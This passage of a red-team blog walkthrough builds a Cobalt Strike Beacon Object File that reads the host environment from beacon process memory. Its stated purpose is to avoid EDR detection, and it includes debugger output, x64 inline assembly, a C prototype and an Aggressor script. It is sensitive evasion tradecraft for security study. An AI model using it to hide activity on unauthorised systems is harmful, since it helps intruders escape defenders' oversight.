full_description = '''Creating the WhereAmI Cobalt Strike BOF 33 minute read Overview This is a walkthrough of creating the Cobalt Strike Beacon Object File (BOF) “Where Am I?” This idea was inspired by Matt Eidelberg’s DEF CON 29 talk Operation Bypass Catch My Payload If You Can. In this talk, Matt shows how EDR heuristics can detect Cobalt Strike beacons based on their behavior. Matt uses an example where after the beacon compromises the endpoint, the first thing it does is run the whoami.exe local binary. This behavior of the host beacon process spawning a new whoami.exe process, triggers the EDR and the beacon is burned! I’ve been doing allot of Windows Internals studying, and this video made a lightbulb go off. I thought “Why not just get the whoami.exe info from the process? It’s already right there in the beacon processes memory!” So that’s what I did! I created a Beacon Object File that grabs the information we’d want, right there from the beacon process memory! Since the goal was to make it ninja/OPSEC safe, I figured why not just do it dynamically with Assembly? About halfway through creation, I bit the bullet and burned the extra time to make it into a blog post as well, so here it is! For the full code to the project see the GitHub repo: GitHub - boku7/whereami I discovered that TrustedSec had already created a BOF for this, and of course they did because they are awesome! If you’d like to view their original work you can find it here: trustedsec/CS-Situational-Awareness-BOF/env Our BOF Flow to get the Environment Variables Dynamically in Memory Below is the high-level flow & WinDBG commands to map our path from the Thread Environment Block (TEB) to the Environment strings we will ultimately display in our Cobalt Strike interactive beacon console. WinDBG has an awesome feature that allows you to supply it a structure & a memory address while debugging a process, and it will format the values there into the struct you supply. To make our BOF work from anywhere in memory, we will use windows operating system functionality to get the TEB address, from the TEB we will get the Process Environment Block (PEB) address, from the PEB we will get the ProcessParameters struct address, and from the ProcessParameters struct we will get the address of the Environment string block & the size of the Environment string block. TEB (GS Register) –> PEB –> ProcessParameters –> Environment Block Address & Environment Size # TEB Address 0:000> !teb TEB at 00000000002ae000 # PEB Address from TEB 0:000> dt !_TEB 2ae000 +0x060 ProcessEnvironmentBlock : 0x00000000`002ad000 _PEB # ProcessParamters Address from PEB 0:000> dt !_PEB 2ad000 +0x020 ProcessParameters : 0x00000000`007423b0 _RTL_USER_PROCESS_PARAMETERS # Environment Address & Size from ProcessParameters 0:000> dt !_RTL_USER_PROCESS_PARAMETERS 7423b0 +0x080 Environment : 0x00000000`00741130 Void +0x3f0 EnvironmentSize : 0x124e Note that even with ASLR off on your windows device, the TEB & PEB address will change pretty much everytime you create a new process. Previewing Our Target Environment Strings with WinDBG WinDBG has a built in feature !peb which will beautifully parse out the PEB structure as it exists in memory for us! By using this command we can neatly see all the Environment strings we will be hunting for when creating this BOF! We can see that !peb command parses out the PEB structure and displays to us the Loader (Ldr) information, the address & resolved strings of the ProcessParameters struct, as well as the Environment information we are targeting. Initial Setup Boot up a windows box Download and Install x64DBG Download and install WinDBG Make sure WinDBG symbols are setup Open any executable PE file If you’re wanting to conquer malware development and learn how to use x64dbg, then work through these epic courses first: Sektor7 (@SEKTOR7net) - RED TEAM Operator: Malware Development Essentials & Intermediate Courses If you are new to WinDBG check out this awesome course: Pavel Yosifovich (@zodiacon) - WinDbg Fundamentals: User Mode If you want to conquer Intel Assembly check out these great courses: Pentester Academy - x86_64 Assembly Language and Shellcoding on Linux Offensive Security - Windows User Mode Exploit Development From TEB to PEB The address of the Thread Environment Block (TEB) can be discovered from anywhere in memory by referencing the GS register for 64 bit, and the FS register for 32 bit. The TEB includes within it the address of the Process Environment Block (PEB). Therefor once we get the TEB using the GS/FS register, we can find the PEB. This walkthrough is for a x64 BOF, so we will be using the GS register. Viewing the TEB in WinDBG To see the TEB for our current thread in WinDBG, just use the !teb command. This displays the TEB for us nicely. 0:000> !teb TEB at 00000000002ae000 ExceptionList: 0000000000000000 StackBase: 0000000000650000 StackLimit: 000000000064d000 SubSystemTib: 0000000000000000 FiberData: 0000000000001e00 ArbitraryUserPointer: 0000000000000000 Self: 00000000002ae000 EnvironmentPointer: 0000000000000000 ClientId: 00000000000008f0 . 0000000000001f30 RpcHandle: 0000000000000000 Tls Storage: 0000000000743340 PEB Address: 00000000002ad000 We can see that the PEB Address is 0x2ad000 for our process. Although we can see the PEB address here, we need to know the offset to the PEB Address pointer within the TEB, so we can do this programmatically in our BOF. Parsing the TEB Structure in Memory Using the TEB address we discovered by using the !teb command, we will feed that into the dt command and parse the memory at the TEB Address 0x2ae000 so we can discover the offset of the PEB Address. 0:000> dt !_TEB 2ae000 ntdll!_TEB +0x000 NtTib : _NT_TIB +0x038 EnvironmentPointer : (null) +0x040 ClientId : _CLIENT_ID +0x050 ActiveRpcHandle : (null) +0x058 ThreadLocalStoragePointer : 0x00000000`00743340 Void +0x060 ProcessEnvironmentBlock : 0x00000000`002ad000 _PEB ... We can see that the PEB Address is at an offset of +0x060 within the TEB. Creating TEB to PEB Shellcode Our goal is to do this in a Cobalt Strike Beacon Object File, so we will need to create the Assembly code to discover the PEB from the TEB programmatically. We will make sure this is Position Independent Code (PIC) by using the GS register to discover the TEB. To test that this works, we will open our PE file in x64dbg. x64dbg has advantages over WinDBG, and WinDBG has advantages over x64dbg. I switch between them allot depending on what I’m trying to do. Set a break point anywhere. Then select the current line that RIP is on. Press the spacebar and edit the assembly. Editing Opcodes in memory with x64dbg We will put 0x60 into the RAX register because we know that the PEB Address is at TEB+0x60. For the next instruction put in mov rbx, gs:[rax]. We are referencing the TEB address using the GS register. This is a Windows internals operating system functionality. We are telling the processor to move the 8-byte value at TEB+0x60 into the RBX register. Our PEB Adress is at TEB+0x60. Now that we have our 2 instructions in, we press F7 to step forward and execute our instructions. The address of the PEB is in RBX and is 0x31E000. Confirming PEB Address To confirm that our assembly code resolves the correct address of the PEB dynamically in memory we can confirm using the Memory Map tab. Our Assembly Code So Far mov rax, 0x60 // RAX = 0x60 = Offset of PEB Address within the TEB mov rbx, gs:[rax] // RBX = PEB Address From PEB to ProcessParameters Get the Address of the PEB Again Now that we have successfully discovered the path to get from any place in process memory to the PEB, we will work on the next goal. Which is getting from the PEB to the ProcessParameters struct. Saving our above PIC shellcode for later, we’ll close down x64dbg for now, and open a PE file in WinDBG. We’ll use WinDBG to walk the PEB struct for the ProcessParameters struct address. Since we are launching a new process, the address of the PEB has changed. We will get this new PEB address to continue our path discovery. This time we will just use the !peb command and skip the TEB stuff as we’ve already figured that out. in WinDBG enter the !peb command in the console to get the address of the PEB in memory 0:000> !peb PEB at 00000000002ad000 Walk the PEB Struct to find ProcessParameters Struct The Process Environment Block (PEB) contains allot of information. Right now, we are discovering where the ProcessParameters struct exists within the PEB. We will note the offset: +0x020 ProcessParameters. 0:000> dt !_PEB 00000000002ad000 ntdll!_PEB ... +0x010 ImageBaseAddress : 0x00000000`00400000 Void +0x018 Ldr : 0x00007ffb`01f9a4c0 _PEB_LDR_DATA +0x020 ProcessParameters : 0x00000000`007423b0 _RTL_USER_PROCESS_PARAMETERS ... From ProcessParameters to Environment Walk the ProcessParameters Struct to find our Environment From the ProcessParameters Struct we will want to note the pointer to the Environment and the EnvironmentSize. 0:000> dx -r1 ((ntdll!_RTL_USER_PROCESS_PARAMETERS *)0x7423b0) ((ntdll!_RTL_USER_PROCESS_PARAMETERS *)0x7423b0) : 0x7423b0 [Type: _RTL_USER_PROCESS_PARAMETERS *] ... [+0x080] Environment : 0x741130 [Type: void *] ... [+0x3f0] EnvironmentSize : 0x124e [Type: unsigned __int64] Now we know that the Environment is at address 0x741130. The size of the Environment is 0x124e (4686 bytes) Viewing the Environment Unicode Strings Now that we know the address and size of the Environment, we can view the memory at that address to confirm 0:000> db 0x741130 0x741130+0x124e 00000000`00741130 3d 00 3a 00 3a 00 3d 00-3a 00 3a 00 5c 00 00 00 =.:.:.=.:.:.\... 00000000`00741140 41 00 4c 00 4c 00 55 00-53 00 45 00 52 00 53 00 A.L.L.U.S.E.R.S. 00000000`00741150 50 00 52 00 4f 00 46 00-49 00 4c 00 45 00 3d 00 P.R.O.F.I.L.E.=. 00000000`00741160 43 00 3a 00 5c 00 50 00-72 00 6f 00 67 00 72 00 C.:.\.P.r.o.g.r. 00000000`00741170 61 00 6d 00 44 00 61 00-74 00 61 00 00 00 41 00 a.m.D.a.t.a...A. 00000000`00741180 50 00 50 00 44 00 41 00-54 00 41 00 3d 00 43 00 P.P.D.A.T.A.=.C. 00000000`00741190 3a 00 5c 00 55 00 73 00-65 00 72 00 73 00 5c 00 :.\.U.s.e.r.s.\. 00000000`007411a0 62 00 6f 00 6b 00 75 00-5c 00 41 00 70 00 70 00 b.o.k.u.\.A.p.p. 00000000`007411b0 44 00 61 00 74 00 61 00-5c 00 52 00 6f 00 61 00 D.a.t.a.\.R.o.a. 00000000`007411c0 6d 00 69 00 6e 00 67 00-00 00 43 00 68 00 6f 00 m.i.n.g...C.h.o. 00000000`007411d0 63 00 6f 00 6c 00 61 00-74 00 65 00 79 00 49 00 c.o.l.a.t.e.y.I. We see that the strings are there as Unicode. You can tell because of the 00 after everything. Windows Unicode strings are 2 bytes (4 hex characters). We can see that the Unicode strings end with a 00 00 where normally its a hex ASCII value followed by a 00. Assembly Shellcode to get to Environment from Anywhere in Memory TEB (GS Register) –> PEB –> ProcessParameters –> Environment xor r10, r10 // R10 = 0x0 - Null out some registers mul r10 // RAX&RDX = 0x0 add al, 0x60 // RAX = 0x60 = Offset of PEB Address within the TEB mov rbx, gs:[rax] // RBX = PEB Address mov rax, [rbx+0x20] // RAX = ProcessParameters Address mov rbx, [rax+0x3f0] // RBX = Environment Size mov rax, [rax+0x80] // RAX = Environment Address Testing That our Code Works We enter in the above Assembly code into a process using x64dbg to test it out. We step through it and see that it resolves the Environment Address & Environment Size. We see that the Environment Address is in the RAX register. The Environment Size is in the RBX register. Confirming the Environment Address Just to make sure, we right-click the RAX value in x64dbg and click ‘View in Dump’. We can confirm that our Environment Unicode strings are at that address. Create a BOF Prototype Now that we know how to dynamically get to the Unicode Environment strings, we will create a simple Cobalt Strike Beacon Object File (BOF) & an Aggressor CNA script (for UI/UX). Creating the our BOF Prototype From a macOS or Linux x64 intel device, install GCC & Ming How to install Ming on macOS: # Install brew on macOS if you need it (https://brew.sh/) /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)" # Install Ming using Brew brew install mingw-w64 Make a folder and change directory into it: `mkdir WhereAmI && cd WhereAmI’ Create a C file named whereami.x64.c with these contents: #include <windows.h> #include "beacon.h" void go(char * args, int len) { BeaconPrintf(CALLBACK_OUTPUT, "[+] Our 'Where am I?' BOF prototype works!"); } Compile the BOF Prototype x86_64-w64-mingw32-gcc -c whereami.x64.c -o whereami.x64.o Executing our BOF from Cobalt Strike Now get a Windows VM and boot it up Start up your Cobalt Strike Team Server Make a beacon in Cobalt Strike and execute it on the windows VM Right click your beacon and click ‘Interact’ to pull up the beacon CLI Use inline-execute from your Cobalt Strike CLI and supply the path to your whereami.x64.o BOF If you need help setting up a Cobalt Strike Team Server, navigating the UI/setup, and just general knowledge on how to operate Cobalt Strike, then 100% check out these AWESOME Cobalt Strike videos created by Raphael Mudge! https://www.cobaltstrike.com/training beacon> inline-execute /Users/bobby.cooke/git/boku7/WhereAmI/whereami.x64.o [*] Tasked beacon to inline-execute /Users/bobby.cooke/git/boku7/WhereAmI/whereami.x64.o [+] host called home, sent: 169 bytes [+] received output: [+] Our 'Where am I?' BOF prototype works! We can see that our prototype works and prints the string to the console after running! Create an Aggressor Script Prototype for UI/UX In our /WhereAmI/ directory, create a file named whereami.cna. This will be the Aggressor script responsible for adding our whereami command to the Cobalt Strike beacon console. whereami.cna beacon_command_register( "whereami", "Displays the beacon process environment without any DLL usage.", "Synopsis: whereami" ); alias whereami { local('$handle $data'); $handle = openf(script_resource("whereami.x64.o")); $data = readb($handle, -1); closef($handle); btask($1, "Where Am I? BOF (Bobby Cooke//SpiderLabs|@0xBoku|github.com/boku7)"); beacon_inline_execute($1, $data, "go"); } Load our Aggressor Script into Cobalt Strike Go to ‘Cobalt Strike’ –> ‘Script Manager’ from the menu bar of Cobalt Strike Click the ‘Load’ button and select our whereami.cna script Testing our BOF & Aggressor Script Now the whereami command is accessible from the interactive beacon console. beacon> help ... whereami Displays the beacon process environment without any DLL usage. beacon> whereami [*] Where Am I? BOF (Bobby Cooke//SpiderLabs|@0xBoku|github.com/boku7) [+] host called home, sent: 164 bytes [+] received output: [+] Our 'Where am I?' BOF prototype works! Everything works! Now time to make it do the thing. Resolving Environment Address & Size with our BOF We will now adjust our code to resolve the Environment Address and Size with our C BOF code. We will use inline assembly code to do this by using the __asm__() GCC function. When w'''
